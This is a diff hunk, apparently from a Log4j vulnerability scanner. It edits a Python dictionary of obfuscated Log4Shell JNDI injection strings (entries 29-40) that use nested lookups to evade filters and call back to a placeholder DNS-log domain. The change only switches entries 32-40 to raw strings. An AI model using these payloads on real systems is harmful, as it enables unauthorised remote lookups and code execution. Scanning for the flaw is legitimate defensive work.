@@ -141,14 +141,14 @@ Log4jScanner
     "29": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}${sys:path.separator}${lower:RMI}://payload_id.dnslog.domain/TomcatBypass/status}',
     "30": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}${sys:path.separator}${lower:RMI}${sys:path.separator}${sys:file.separator}${sys:file.separator}payload_id.dnslog.domain/status}',
     "31": r'${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}${sys:path.separator}${lower:RMI}${sys:path.separator}${sys:file.separator}${sys:file.separator}payload_id.dnslog.domain${sys:file.separator}status}',
-    "32": "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap$ {env:NaN:-:}//payload_id.dnslog.domain/status}",
-    "33": "${jn${env::-}di:${::-l}${::-d}${::-a}${::-p}://payload_id.dnslog.domain/status}",
-    "34": "${jn${date:}di${date:':'}${::-l}${::-d}${::-a}${::-p}://payload_id.dnslog.domain/status}",
-    "35": "${j${k8s:k5:-ND}i${sd:k5:-:}${::-l}${::-d}${::-a}${::-p}://payload_id.dnslog.domain/status}",
-    "36": "${j${main:\k5:-Nd}i${spring:k5:-:}${::-l}${::-d}${::-a}${::-p}://payload_id.dnslog.domain/status}",
-    "37": "${j${sys:k5:-nD }${lower:i${web:k5:-:}}${::-l}${::-d}${::-a}${::-p}://payload_id.dnslog.domain/status}",
-    "38": "${j${::-nD}i${::-:}${::-l}${::-d}${::-a}${::-p}://payload_id.dnslog.domain/status}",
-    "39": "${j${EnV:K5:-nD}i:${::-l}${::-d}${::-a}${::-p}://payload_id.dnslog.domain/status}",
-    "40": "${j${lower:Nd }i${uPper::}${::-l}${::-d}${::-a}${::-p}://payload_id.dnslog.domain/status}"
+    "32": r"${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap$ {env:NaN:-:}//payload_id.dnslog.domain/status}",
+    "33": r"${jn${env::-}di:${::-l}${::-d}${::-a}${::-p}://payload_id.dnslog.domain/status}",
+    "34": r"${jn${date:}di${date:':'}${::-l}${::-d}${::-a}${::-p}://payload_id.dnslog.domain/status}",
+    "35": r"${j${k8s:k5:-ND}i${sd:k5:-:}${::-l}${::-d}${::-a}${::-p}://payload_id.dnslog.domain/status}",
+    "36": r"${j${main:k5:-Nd}i${spring:k5:-:}${::-l}${::-d}${::-a}${::-p}://payload_id.dnslog.domain/status}",
+    "37": r"${j${sys:k5:-nD }${lower:i${web:k5:-:}}${::-l}${::-d}${::-a}${::-p}://payload_id.dnslog.domain/status}",
+    "38": r"${j${::-nD}i${::-:}${::-l}${::-d}${::-a}${::-p}://payload_id.dnslog.domain/status}",
+    "39": r"${j${EnV:K5:-nD}i:${::-l}${::-d}${::-a}${::-p}://payload_id.dnslog.domain/status}",
+    "40": r"${j${lower:Nd }i${uPper::}${::-l}${::-d}${::-a}${::-p}://payload_id.dnslog.domain/status}"
 }
 ```
